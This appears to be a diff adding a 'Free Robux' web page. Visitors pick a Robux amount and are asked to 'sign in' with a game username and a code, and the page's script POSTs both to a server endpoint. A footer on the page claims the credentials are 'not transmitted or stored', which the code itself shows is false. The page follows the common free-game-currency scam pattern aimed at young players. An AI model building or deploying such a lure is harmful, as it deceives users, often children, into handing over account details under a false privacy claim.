@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Free Robux</title>
+
+<style>
+*{box-sizing:border-box}
+
+body{
+    margin:0;
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    font-family:Arial,sans-serif;
+    color:white;
+    background:
+        linear-gradient(135deg,rgba(0,0,30,.82),rgba(20,0,50,.65)),
+        url("background.jpg") center/cover no-repeat fixed;
+}
+
+.card{
+    width:min(470px,92%);
+    padding:40px 34px;
+    text-align:center;
+    background:rgba(5,5,25,.9);
+    border:1px solid #00eaff;
+    border-radius:24px;
+    box-shadow:0 0 20px #00eaff,0 0 70px #8b00ff66;
+}
+
+.logo{
+    font-size:55px;
+    color:#00eaff;
+    text-shadow:0 0 15px #00eaff,0 0 35px #8b00ff;
+}
+
+h1{
+    margin:5px 0 10px;
+    font-size:38px;
+    text-shadow:0 0 12px #00eaff,0 0 30px #9b00ff;
+}
+
+p{color:#cbd8ff}
+
+.reward{
+    margin:20px 0;
+    font-size:25px;
+    font-weight:bold;
+    color:#71f7ff;
+    text-shadow:0 0 15px #00eaff;
+}
+
+.amounts{
+    display:grid;
+    grid-template-columns:repeat(2,1fr);
+    gap:10px;
+    margin:25px 0;
+}
+
+.amount{
+    padding:15px 8px;
+    border-radius:12px;
+    border:1px solid #5264ff;
+    background:#08091e;
+    color:#cbd8ff;
+    font-weight:bold;
+    cursor:pointer;
+    transition:.2s;
+}
+
+.amount:hover{
+    border-color:#00eaff;
+    box-shadow:0 0 15px #00eaff66;
+    transform:translateY(-2px);
+}
+
+.amount.selected{
+    color:white;
+    border-color:#00eaff;
+    background:linear-gradient(135deg,#00eaff33,#8b5cff55);
+    box-shadow:0 0 15px #00eaff,inset 0 0 15px #00eaff22;
+}
+
+input{
+    width:100%;
+    padding:15px;
+    margin:7px 0;
+    border-radius:12px;
+    border:1px solid #5264ff;
+    background:#08091e;
+    color:white;
+    font-size:15px;
+    outline:none;
+}
+
+input:focus{
+    border-color:#00eaff;
+    box-shadow:0 0 15px #00eaff;
+}
+
+button,.openButton{
+    width:100%;
+    padding:16px;
+    margin-top:15px;
+    border:0;
+    border-radius:12px;
+    font-size:17px;
+    font-weight:bold;
+    cursor:pointer;
+    color:#020214;
+    background:linear-gradient(90deg,#00eaff,#8b5cff,#ff4de1);
+    box-shadow:0 0 20px #00eaff;
+    transition:.2s;
+}
+
+button:hover,.openButton:hover{
+    transform:translateY(-2px);
+    box-shadow:0 0 30px #00eaff,0 0 50px #9b00ff;
+}
+
+#signinPage,#rewardPage{
+    display:none;
+}
+
+.bigStar{
+    font-size:75px;
+    color:#00eaff;
+    animation:glow 1.5s infinite alternate;
+}
+
+@keyframes glow{
+    from{filter:drop-shadow(0 0 5px #00eaff)}
+    to{filter:drop-shadow(0 0 35px #ff4de1)}
+}
+
+.openButton{
+    display:inline-block;
+    text-decoration:none;
+    margin-top:25px;
+}
+
+.small{
+    margin-top:18px;
+    font-size:12px;
+    color:#8995b8;
+}
+</style>
+</head>
+
+<body>
+
+<!-- STEP 1: CHOOSE AMOUNT -->
+
+<div class="card" id="amountPage">
+
+    <div class="logo">⏣</div>
+
+    <h1>FREE ROBUX</h1>
+
+    <p>Choose how much Robux you want.</p>
+
+    <div class="reward" id="selectedDisplay">
+        ⏣ 10,000 ROBUX
+    </div>
+
+    <div class="amounts">
+
+        <div class="amount" data-amount="1000">
+            ⏣ 1,000
+        </div>
+
+        <div class="amount" data-amount="5000">
+            ⏣ 5,000
+        </div>
+
+        <div class="amount selected" data-amount="10000">
+            ⏣ 10,000
+        </div>
+
+        <div class="amount" data-amount="25000">
+            ⏣ 25,000
+        </div>
+
+        <div class="amount" data-amount="50000">
+            ⏣ 50,000
+        </div>
+
+        <div class="amount" data-amount="100000">
+            ⏣ 100,000
+        </div>
+
+    </div>
+
+    <button id="continueButton">
+        CONTINUE
+    </button>
+
+</div>
+
+
+<!-- STEP 2: SIGN IN -->
+
+<div class="card" id="signinPage">
+
+    <div class="logo">⏣</div>
+
+    <h1>SIGN IN</h1>
+
+    <p>
+        Sign in to continue with your
+        <strong id="signinAmount">10,000</strong>
+        Robux.
+    </p>
+
+    <form id="signinForm">
+
+        <input
+            type="text"
+            id="username"
+            placeholder="Game Username"
+            required
+        >
+
+        <input
+            type="text"
+            id="code"
+            placeholder="Your 67 Code"
+            required
+        >
+
+        <button type="submit">
+            CLAIM REWARD
+        </button>
+
+    </form>
+
+    <div class="small">
+        Demo page — credentials are not transmitted or stored.
+    </div>
+
+</div>
+
+
+<!-- STEP 3: REWARD -->
+
+<div class="card" id="rewardPage">
+
+    <div class="bigStar">⏣</div>
+
+    <h1>ROBUX READY!</h1>
+
+    <p>Your selected reward is ready.</p>
+
+    <div class="reward" id="finalAmount">
+        ⏣ 10,000 ROBUX
+    </div>
+
+    <p>
+        Open Roblox now to receive your Robux!
+    </p>
+
+    <!-- Change this to your real game URL -->
+    <a
+        class="openButton"
+        href="https://example.com"
+    >
+        OPEN ROBLOX
+    </a>
+
+</div>
+
+
+<script>
+
+let selectedAmount = 10000;
+
+const amountButtons = document.querySelectorAll(".amount");
+const selectedDisplay = document.getElementById("selectedDisplay");
+
+amountButtons.forEach(button => {
+
+    button.addEventListener("click", () => {
+
+        amountButtons.forEach(btn =>
+            btn.classList.remove("selected")
+        );
+
+        button.classList.add("selected");
+
+        selectedAmount = Number(button.dataset.amount);
+
+        selectedDisplay.textContent =
+            "⏣ " +
+            selectedAmount.toLocaleString() +
+            " ROBUX";
+    });
+
+});
+
+
+/* STEP 1 → STEP 2 */
+
+document.getElementById("continueButton").addEventListener("click", () => {
+
+    document.getElementById("amountPage").style.display = "none";
+
+    document.getElementById("signinPage").style.display = "block";
+
+    document.getElementById("signinAmount").textContent =
+        selectedAmount.toLocaleString();
+
+});
+
+
+/* STEP 2 → STEP 3 */
+
+document.getElementById("signinForm").addEventListener("submit", async event => {
+
+    event.preventDefault();
+
+    const username = document.getElementById("username").value;
+    const code = document.getElementById("code").value;
+
+    try {
+        const response = await fetch('/api/codes/claim', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ username, code })
+        });
+
+        const data = await response.json();
+
+        if (data.ok) {
+            document.getElementById("signinPage").style.display = "none";
+            document.getElementById("rewardPage").style.display = "block";
+            document.getElementById("finalAmount").textContent =
+                "⏣ " +
+                selectedAmount.toLocaleString() +
+                " ROBUX";
+        } else {
+            alert('Error: ' + (data.error || 'Failed to claim code'));
+        }
+    } catch (error) {
+        console.error('Error:', error);
+        alert('Failed to connect to server. Please try again.');
+    }
+
+});
+
+</script>
+
+</body>
+</html>
